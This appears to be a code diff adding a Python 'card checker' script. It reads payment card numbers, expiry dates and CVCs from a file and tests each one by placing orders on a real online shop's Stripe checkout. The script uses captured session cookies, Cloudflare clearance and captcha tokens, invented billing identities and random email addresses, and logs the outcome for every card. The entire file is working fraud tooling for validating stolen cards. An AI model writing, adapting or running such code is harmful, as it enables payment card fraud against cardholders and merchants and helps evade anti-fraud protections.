@@ -1,0 +1,119 @@
+import requests, re
+import time
+import random, string
+
+def generate_random_account():
+    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'
+
+acc = generate_random_account()
+
+def Tele(ccx):
+    import requests
+    ccx=ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    if "20" in yy:
+        yy = yy.split("20")[1]
+    r = requests.session()
+
+    cookies = {
+        '__stripe_mid': '4eb815b5-8607-488f-9748-7e54c1e301cb28eb3a',
+        'age_gate': '25',
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2026-04-12%2011%3A42%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_first_add': 'fd%3D2026-04-12%2011%3A42%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F147.0.0.0%20Safari%2F537.36',
+        'cf_clearance': 'M6gE.ePmrCc22zb0ugnnfHduYn6qVJfJq5HuioovDAc-1775995934-1.2.1.1-SzUQFK5ERnGSMS8mHQ0IQX_rLgAHlToWIuoBfq3LBUdmCx0VmEHsJ3w2H2LH.IrzPTlhuQTScvusQEm3bXbooQhqB0QhIg1r7bYlUowlmAdumjliwKSB1TtVjQxRKDZzg6YjgRqGw_rbU_BK5CWpdyylER4.yjGIc7wR4IHuWqRszyodo1UCrkJiOVtpokEJ00pW4nBuKcSCkpJ0jzo5bakuM.7QEiQgtCdhPXSYnqVKSiXAKaJbZWitLIOcSfefTNAQHXgC1V5MJOpY3HnIU2dQ48nNuBnZ1XtugkH0qqYUEa8cdsLxQcdBnSqHanC2tYA12zdY0Wcno_sDUhcBVg',
+        'woocommerce_items_in_cart': '1',
+        'woocommerce_cart_hash': '96a57337fad38776863c860a5d530648',
+        'wp_woocommerce_session_164a66861bc6ce91621bc987075a66aa': 't_cc7ff416558cc3b33a9e16721a589b%7C1776168734%7C1776082334%7C%24generic%24BgsUTZV5MOwAGWZEv93REcyjXqRi9hsrJRiw6khi',
+        '__stripe_sid': '5ed8046b-4b8d-4fa9-ba70-60e6de12b6c4662d05',
+        'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2Fcheckout%2F',
+        'et-editor-available-post-223-fb': 'fb',
+    }
+
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9,ru;q=0.8,hi;q=0.7',
+        'cache-control': 'max-age=0',
+        'priority': 'u=0, i',
+        'referer': 'https://middletempleshop.org.uk/basket/',
+        'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
+        # 'cookie': '__stripe_mid=4eb815b5-8607-488f-9748-7e54c1e301cb28eb3a; wp_woocommerce_session_164a66861bc6ce91621bc987075a66aa=t_cc7ff416558cc3b33a9e16721a589b%7C1776005186%7C1775918786%7C%24generic%24BiNHBToEO7wZgblDdko70JtL4K0U5tHtz_oxpoDk; age_gate=25; woocommerce_items_in_cart=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-11%2012%3A03%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-11%2012%3A03%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F147.0.0.0%20Safari%2F537.36; cf_clearance=TVUZ2fWFjoqp08tH4awk4_HexAzOr._uo9LFksT2Pw0-1775910810-1.2.1.1-NWWS7QdgnhYbEY2EI.zgkZIR7NmXuQb9HUKBIsOcy8_g6yqUX3cBj5JQMsE.SSMBvA9SDSz74iwGObGjiAkqae7lPLHjywD3LiELgps9KRlIls8RTp7ok7_4JjYG0zpe7CEfG8fek5KDMoB6OocrG4YBYO0GXVujkWtN_FLMNAe2SH7hE2OQcZZbYQyjvQEbgjPR9FOta2TRnVmKkHLX06CpN4Ez3Wz8P.d0.eWhlwHj2t5_WafJtaz4yWPgs6ksDIsCr7VMzuEvLqvFQwq2X5VaaxaCpT4WKpfI.0U0eVGHKB7sG7RN_Yhm0VSOuOU1lRYLTdSz0JA25FyG8r9a7w; __stripe_sid=d0bd84ac-5f94-4b49-bdb0-22d5e9520cf3be7361; et-editor-available-post-223-fb=fb; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2Fcheckout%2F; woocommerce_cart_hash=96a57337fad38776863c860a5d530648',
+    }
+
+    response = requests.get('https://middletempleshop.org.uk/checkout/', cookies=cookies, headers=headers)
+
+    nonce = re.search(r'"woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="([^"]*)"', response.text).group(1)
+
+    headers = {
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9,ru;q=0.8,hi;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'priority': 'u=1, i',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
+    }
+
+    data = f'billing_details[name]=David+Mickey&billing_details[email]={acc}&billing_details[phone]=8452632512&billing_details[address][city]=London&billing_details[address][country]=GB&billing_details[address][line1]=Flat+4B+27+Baker+Street&billing_details[address][line2]=&billing_details[address][postal_code]=SW1A+1AA&billing_details[address][state]=&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fmiddletempleshop.org.uk&time_on_page=121906&client_attribution_metadata[client_session_id]=f1b54364-529b-441b-8199-5079a50c2fcf&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_id]=elements_session_1nblyrsFUyD&client_attribution_metadata[elements_session_config_id]=a504155e-c242-4b39-8ecd-9fe30c9daac9&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=1998080e-229f-4fe0-a215-6be47b4f0897f26e69&muid=4eb815b5-8607-488f-9748-7e54c1e301cb28eb3a&sid=d0bd84ac-5f94-4b49-bdb0-22d5e9520cf3be7361&key=pk_live_51EDVq7DSiAYEA5MmFRgEvN490foZPU0dDIVd6UlD06fNvmTi2ASOIaDjOvCMUk12iUlvkYlKOcPhEfUuGmrb22HW00zhdMCdaB&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc1OTExNzY3LCJjZGF0YSI6IjNBb3greXNCRUJTSE1CQXhWeHpMVVExTjRnQ0RKNFdkQ0dqT2tWSmxJSTlvVVFITzE2b1U2WW5ESnM3eWo1RVUxUUVQZ1Rqa0NldHBzd0RYamVVM3l1dVVaSkM3LzRXS2JDbklhWk1EUWJFNGR6UlJHVjlZbzg2dGlDTEFleFpqMU03aWh4SXF5ZTdERzdQdHNweWJHWFBSL0tqY0FMSkNUcjZaMEtRVTc0S0tLa2h0b0M1OVFpZU1PVWFOSmdKMkNrc3ptYUlJT1p6WWtwbTRuVkU4TXR1ekxyS1pGU0VHU2dSQ24wTjc1UUtJMjdNTjFFQWFXNmszMDU2ckNWRUMyQ09PMWIrcXIxM1pibUQzQlJqcjJYSjBFTnZ2SXZmbGphZUF3ZTY1NGtmdVdLZmJBM1FUbUJ2dmhTWW14ZURRUkRuelR2ckh5MlM3RjNwSEJrVW1LRCtOditlM25XMnhmM043ZEdVUnVzbz1PRGtteTBBZHlxdG1GR00zIiwicGFzc2tleSI6InMvWkw2S2RlbUdFS0hscnN1REEwSVk5eVBXekMwS0lxVWt4WjhpS0NXVFRLM3Fvdm1DdjBITUNKSzZPNXo2TDkyN1VNak5CZUxpS2ZYazVKbXRmT3hBMk9Kalp1NGUvVldMcHExVkY4SEpqbW8zeG5hSm40cDdWaFFJTUxaaVF1RytPVExDVGtVNGd3dHdwRUNNTzNDWjBuWnNkd1FFK0tmYW1EWC9HTFoxdU9kYlkwaEJiSzdZWE9ydzdkeDlpOW1ldXg0V2lwNURXL0llc3BETjNzbmVWV1JCS1pCclRBekRwOVY5clAvOVJ0ZEp2T3JMcXFSMkFwbGxnSUh5S05tZDZFMmhWeGU3NmszQWRmV3ZtN0NPNC8rYW01UmtreGoyYkRBWmR4dDJIc0xwNE9JM2FFSmlqUDdiNk1iR01ld3p3b05va2htSE8xckQweFQ4ZEEyNWVKZHVWa0txV3BWaVRsOGhZRWVwOU1LK1I3N0drMEprTkNjRm5ZZEZpZXdpZG9xMGkwSExJelJodGtZSGdzUUtGVnN0and2eWlJbWZINFhNeHE1Y2lQaWFxSnJ0QlRlSU9HOG9wTEpDM016cGQ5R0FPdjducDRlL0VBUEhhMmJUR3hHSDdOSGJYZS83S0RmcGE0YmJvdGswS3Uwam8zUC9EYkVsTG93Z2F4NXJyRlBobGtJWEFKTDl3Y2F4VFFMa0luRWZjUHE2UkgxOUsxbjJMYkYvV2ZqWTlWMjdGK2NxcmVFKzhnVFRidTQ4RzNMakRydVJaL0xSOVJjMlVPRkl5VmZrditnajZ2eXU3RC85S1lkV3hVTDB5d3kxWW0xaCtwREdMM2RXRnNQRzNjOHB2VzZBRjRrSU9IZ1o0dllDSURMekFUUlBZNEpHdm1KUmdWWTJyLzFnbjZ1djhPNm1YSlRMTVJOR3gvWFdLR0Y1K2FzUll2QVZDVnlnQXdDc1JDRXpIUFpxaWMyU3NiTUxmQ3Q3Qmt1dU1hNldzc0haTklRT0JMdEMxR1MrMjhUaEt0STdrZHByRjFTZUhEbjNmZklFZlJHNEZqWWErb2xIM1hvTkw3akg4RFAwQTM0eWVibE1kZXFrUzVBU2JvQmJJazRzcldHU00vOWRBSnpWcDVDOHpxVDdYNkZFQXZ4UEN5MDlrQVdnYVhKTlNVYjd2ZlZuaDdDc1Vnb0x5MlBtS3FncVpMNkRYRVZPaXJsOUcwUkJDNFRnZ1B3QzhjTCtEWWJZZ3JGSFQ0bHlXcDdlQVozdVNLczBVWEhhVHJwZWxtamx6WHdGQm9lbzI1NmxRS1BxZXlzSUwrTHZJNUt3TWhzNVFKc1cwdUdRbzJ1YkZBSG93L3FHaDZGYXJIekRvYTU5Sm9aOUIzVi9yZmJrUHZIWTJHRXhuYnpEZ2JGbHMyczNXbGMxamFqenFiaG0rWmlUQzlxd0lQc3RvaTRqZHZlRkk1ejVwNk40a3JyU1UyMFVMM3NiVUZ4b3VuTjJCa3I1UEtVQ2p0TXJkUnJhUm5pNTNmcXY2R0syY09vSFVNZ09SK1BGQnB1WW1aZGdBR2N5ZTZxK1dBNTRtQklUT0pEK0VkOUtYTmxQZUxZeC84b2J1TEVCaFVrZmRUKzIwQWNYbnUwUXdoL0hhN3ZGVEUzeC81U0xaaUtMTTBtVDVuVEZ4cndBd2Q3STdmVlh4aTFKZXE1NUtySk50WEtoeHRleDU5SE84UTFXMWtqdUpCbDRHMkhyeXhYMWUrckowR01qT2hrZlU5UUxDRWVWS3hCL0dKS3pidjl5NWc5eFBFUDFpUVhVMTZ6dXhuT01wQVhOMkQ4NjNraTdpNjliWHNyTnlQSm9adzJQR2JRUDJTZFVqbC9iTVpITm1uNzFnenpqdERnallDM092L0RVK1ZObEU0R3pjRVg0c3hDUW1TNTRSMk1nT3NiTC95MlJoK25pMVlmY1ZZdGJNc3JsaWNwcHo3TWF0dm44bHhLMUdWWmVOenZxVVhTRGJkbWx6NkNrdXBKd0NldWxFSnhpcmNwWHRPZUFlbjNwZisxR3RHNzNYUTRCVUI3YkxCdk93TU1SdUJlbStFNG1Ld3E4SDN5TjZ1eFk2QTcvcUtHS2plT0ZCYTBCVW9jMEJENmFDV3d3b2xrNFJkUXRDaXdJa1BKMHRWa1dSaWJia0Vza1lSNlkxTFFmUUtyWmpOblVtSGRHTTg0TTEreTJrNkRpMnR1Wmg3VlphelJGdWk3WXUvUWR2UGJHWExwajhGYVNzOHZsYW9zdER4TzdsMW54ZnA2cER4dmJFNi85akR3MHYrQm9nL1BvZGNkaWtZd3p1VUtkT0wzMGpNWTJWSEFvbFo4N3djUTJFMTJhQ3BwK2pueittZ1lTSUlVU0VsWEdKaGNrZUVyd0Q4d1hJVGpFUXZhVkZnZDUyU21WVHdJSzVsUmRUNWdOR3NYa0pIZmxZb1FlQk9HRWxoc0h5NTJYSCtSbTJ2S2VBL2lIU0RYdEdiUFl1TkNHcmxvVVV6cDRxWEgzZVdrUDE1MEsrVG40eDlwSDRSV0RwWW9WZDJTMHNQbEM3REpmbHovakRzVzBkMUhmOTdjbnFsNSt3WVdqeURqTko5QkNhQU1KZnIvQXMvTXVXYWxGUk41NXJwclpGWW5wRmtDK1gxZXljRCtzdHNJZ1h3SStqK2xpSzZ4UWxiSkNwMVFGMUdwbG52dExDd1VqRnFhUWZOOVRxSjlDU0NTYlZ6YytwUWlFNTNWWXdKUm95VFNtdVpjOVY3MDBwdmV4N25BN3FMWDNSbmxxUVIiLCJrciI6IjNiZDc4NjZhIiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.nUD9k0ffA0kdrgfB0ZzVv9zdSp_8m0x1OkzZ9fPwKoQ'
+
+    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+    pm = response.json()["id"]
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-US,en;q=0.9,ru;q=0.8,hi;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://middletempleshop.org.uk',
+        'priority': 'u=1, i',
+        'referer': 'https://middletempleshop.org.uk/checkout/',
+        'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+        # 'cookie': '__stripe_mid=4eb815b5-8607-488f-9748-7e54c1e301cb28eb3a; wp_woocommerce_session_164a66861bc6ce91621bc987075a66aa=t_cc7ff416558cc3b33a9e16721a589b%7C1776005186%7C1775918786%7C%24generic%24BiNHBToEO7wZgblDdko70JtL4K0U5tHtz_oxpoDk; age_gate=25; woocommerce_items_in_cart=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-11%2012%3A03%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-11%2012%3A03%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F147.0.0.0%20Safari%2F537.36; __stripe_sid=d0bd84ac-5f94-4b49-bdb0-22d5e9520cf3be7361; et-editor-available-post-223-fb=fb; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmiddletempleshop.org.uk%2Fcheckout%2F; cf_clearance=dAZJ6SgJzB1UiIScfjpvwrg0gltPEmpy6rmaQsOaz2A-1775911641-1.2.1.1-JA4jYaw6WNC0OkYTnLtAeKGflH4ac.M_nf72heevLdTlSpJy_1dGQkljI5D9QbVd4OfwuHD_gq73rpIkAm.UTYBq4SUBvtqrNalzPTCB8EhzQ7Zql9zjmrcQCycczuhHtzR4xZ.9mhBu6Q3z_SNkwRwmzwjpKTFh_WSp7CfpT_PLny3VYSL8dsiAAEKpm1XyrtIKyDaFu7mLxs.cWn1bFd1Tc7c3THXC.8fj7lR5kMGA5xS9mAyQ3NOPyfANYxxWTwi3hS5pDYDTWLPzX.UT4cr_PK97IOBRv60crqaY22PknIyuopYjMfG479u.vzMLeJYFMby65zUZ9oHSr7iMVw; woocommerce_cart_hash=96a57337fad38776863c860a5d530648',
+    }
+
+    params = {
+        'wc-ajax': 'checkout',
+    }
+
+    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fmiddletempleshop.org.uk%2F&wc_order_attribution_session_start_time=2026-04-11+12%3A03%3A29&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F147.0.0.0+Safari%2F537.36&billing_first_name=David&billing_last_name=Mickey&billing_company=&billing_country=GB&billing_address_1=Flat+4B+27+Baker+Street&billing_address_2=&billing_city=London&billing_state=&billing_postcode=SW1A+1AA&billing_phone=8452632512&billing_email=savok45427%40fpxnet.com&shipping_first_name=David&shipping_last_name=Mickey&shipping_company=&shipping_country=US&shipping_address_1=8847+Odin+Rd+Sw&shipping_address_2=&shipping_city=Albuquerque&shipping_state=NM&shipping_postcode=87121&shipping_phone=8452632512&order_comments=&shipping_method%5B0%5D=local_pickup%3A4&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={pm}'
+
+    response = requests.post('https://middletempleshop.org.uk/', params=params, cookies=cookies, headers=headers, data=data)
+
+    return response.json()
+
+
+def check_cards_from_file(file_name):
+    with open(file_name, 'r') as file:
+        for line in file:
+            result = Tele(line)
+            print(f"Card: {line.strip()} - Result: {result}")
+            open('results.txt', 'a').write(f"Card: {line.strip()} - Result: {result}\n")
+
+check_cards_from_file('cc.txt')
